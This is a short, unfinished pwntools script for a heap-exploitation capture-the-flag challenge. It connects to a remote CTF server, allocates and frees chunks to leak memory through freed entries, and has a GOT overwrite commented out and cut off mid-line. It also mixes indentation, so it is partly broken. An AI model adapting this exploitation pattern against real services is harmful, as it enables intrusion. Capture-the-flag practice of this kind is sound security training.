from pwn import *

def add(index,size,data):
	p.sendlineafter('>> ','1')
	p.sendlineafter(':\n', str(index))
	p.sendlineafter(':\n', str(size))	
	p.sendlineafter(':\n', str(data))

def edit(index,data):
	p.sendlineafter('>> ','2')
	p.sendlineafter(':\n', str(index))
        p.sendlineafter(':\n', str(data))

def delete(index):
	p.sendlineafter('>> ','3')
	p.sendlineafter(':\n', str(index))

def check(index):
	p.sendlineafter('>> ','4')
	p.sendlineafter(':\n', str(index))

#p = process('hunfen')
p = remote('ctf.j0n9hyun.xyz', 3041)
e = ELF('./hunfen')
l = e.libc

context.log_level="debug"

size = 256
add(0,size,1)
add(1,1023,1)
add(2,size,1)

delete(0)
delete(1)
check(0)
pause()
check(1)

#edit(0,p64(e.got['puts']))
#add(3,size,4)
#add(4,size,p64(


p.interactive()
